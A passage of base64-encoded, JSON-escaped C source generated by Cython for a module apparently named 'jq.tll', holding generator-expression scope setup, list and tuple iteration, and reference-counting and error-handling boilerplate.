X3Njb3BlKSkge1xuICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKVB5X05vbmUpO1xuICAgIF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgICBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MMV9lcnJvcilcbiAgfSBlbHNlIHtcbiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgfVxuICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wO1xuICBfX1B5eF9JTkNSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApO1xuICB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBfX1B5eF9HZW5lcmF0b3JfTmV3KChfX3B5eF9jb3JvdXRpbmVfYm9keV90KSBfX3B5eF9nYl8yanFfM3RsbF81Z2VuZXJhdG9yMSwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qcSk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yanFfM3RsbF81Z2VuZXJhdG9yMShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSBcbntcbiAgc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlfc3NpemVfdCBfX3B5eF90XzI7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF84O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHtcbiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuO1xuICAgIGRlZmF1bHQ6IFxuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiBOVUxMO1xuICB9XG4gIF9fcHl4X0wzX2ZpcnN0X3J1bjo7XG4gIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wxX2Vycm9yKSB9XG4gIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHtcbiAgICBfX3B5eF90XzEgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzA7IF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMiA9IDA7XG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgfSBlbHNlIHtcbiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDFfZXJyb3IpXG4gIH1cbiAgZm9yICg7Oykge1xuICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHtcbiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF8xLCBfX3B5eF90XzIpO1xuICAgICAgICArK19fcHl4X3RfMjtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIHtcbiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7XG4gICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICsrX19weXhfdF8yO1xuICAgICAgfVxuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MMV9lcnJvcilcbiAgICB9IGVsc2Uge1xuICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIHtcbiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTtcbiAgICAgICAgaWYgKGV4Y190eXBlKSB7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgfVxuICAgICAgICBicmVhaztcbiAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfaSk7XG4gICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2ksIF9fcHl4X3RfNCk7XG4gICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgX19weXhfdF81ID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzggPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfN307XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpO1xuXG4gIFxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHtcbiAgICBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKDApO1xuICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICB9XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpO1xuICAjZW5kaWZcbiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTtcbiAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKChQeU9iamVjdCopX19weXhfZ2VuZXJhdG9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yanFfM3RsbF84Z2VuZXJhdG9yMihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJqcV8zdGxsXzZnZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopX19weXhfdHBfbmV3XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7XG4gIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkge1xuICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKVB5X05vbmUpO1xuICAgIF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgICBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMV9lcnJvcilcbiAgfSBlbHNlIHtcbiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgfVxuICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wO1xuICBfX1B5eF9JTkNSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApO1xuICB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBfX1B5eF9HZW5lcmF0b3JfTmV3KChfX3B5eF9jb3JvdXRpbmVfYm9keV90KSBfX3B5eF9nYl8yanFfM3RsbF84Z2VuZXJhdG9yMiwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qcSk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yanFfM3RsbF84Z2VuZXJhdG9yMihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSBcbntcbiAgc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlfc3NpemVfdCBfX3B5eF90XzI7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF84O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHtcbiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuO1xuICAgIGRlZmF1bHQ6IFxuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiBOVUxMO1xuICB9XG4gIF9fcHl4X0wzX2ZpcnN0X3J1bjo7XG4gIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wxX2Vycm9yKSB9XG4gIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHtcbiAgICBfX3B5eF90XzEgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzA7IF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMiA9IDA7XG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgfSBlbHNlIHtcbiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDFfZXJyb3IpXG4gIH1cbiAgZm9yICg7Oykge1xuICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHtcbiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF8xLCBfX3B5eF90XzIpO1xuICAgICAgICArK19fcHl4X3RfMjtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIHtcbiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7XG4gICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICsrX19weXhfdF8yO1xuICAgICAgfVxuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMV9lcnJvcilcbiAgICB9IGVsc2Uge1xuICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIHtcbiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTtcbiAgICAgICAgaWYgKGV4Y190eXBlKSB7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgUHlFcnJfQ2xl